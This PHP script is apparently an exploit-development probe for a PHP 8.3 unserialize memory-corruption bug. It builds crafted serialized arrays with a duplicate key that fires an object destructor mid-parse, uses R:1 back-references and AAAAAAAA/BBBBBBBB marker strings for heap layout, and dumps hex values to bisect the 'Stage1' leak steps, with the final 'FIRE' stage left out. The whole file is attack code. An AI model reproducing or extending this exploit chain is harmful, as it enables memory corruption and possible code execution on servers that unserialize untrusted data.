<?php
// fa_probe.php — bisect the Stage1 dtor steps on 8.3.36 CLI (container)
// step 1: empty dtor; 2: dance unserialize + count; 3: +arr[129] dump;
// 4: + u-call leaks; 5: full Stage1 minus FIRE.
$STEP = (int)($argv[1] ?? 1);
echo "step=$STEP\n";

class D { public static string $dp = ''; public static string $fp = ''; }

class Stage1 {
    public function __destruct() {
        global $STEP;
        echo "dtor-enter\n"; flush();
        if ($STEP < 2) { echo "dtor-done(empty)\n"; return; }
        $arr = unserialize(D::$dp);
        echo "dance ok count=", count($arr), "\n"; flush();
        if ($STEP < 3) { return; }
        $blk = $arr[129] ?? 'NOKEY';
        echo "arr129=", var_export($blk, true), "\n"; flush();
        $i = -1;
        foreach ($arr as $k => $v) { $i++;
            if ($i < 5) { echo "elem[$i] k=", var_export($k, true), " v=", var_export(is_int($v) ? dechex($v) : (is_string($v) ? 's:' . strlen($v) : gettype($v)), true), "\n"; }
        }
        echo "dtor-done(step3)\n"; flush();
        if ($STEP < 4) { return; }
        $u2 = unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        echo "u-call leaks done\n"; flush();
        if ($STEP < 5) { return; }
        echo "dtor-done(step4)\n";
    }
}

$d  = 'i:129;i:5;';
$d .= 'i:1028;i:1;';
$d .= 'i:8;s:8:"AAAAAAAA";';
$d .= 'i:10;i:1;';
$d .= 'i:12;s:8:"BBBBBBBB";';
for ($m = 5; $m <= 61; $m++) { $d .= 'i:' . (2*$m+4) . ';i:1;'; }
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256*$j) . ';R:1;'; }
$d .= 'i:16896;i:1;';
D::$dp = 'a:127:{' . $d . '}';

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:6:"Stage1":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';

echo "=== attempt ===\n";
$r = unserialize($payload);
echo "outer ok=", var_export($r !== false, true), "\n";
echo "SCRIPT-END\n";
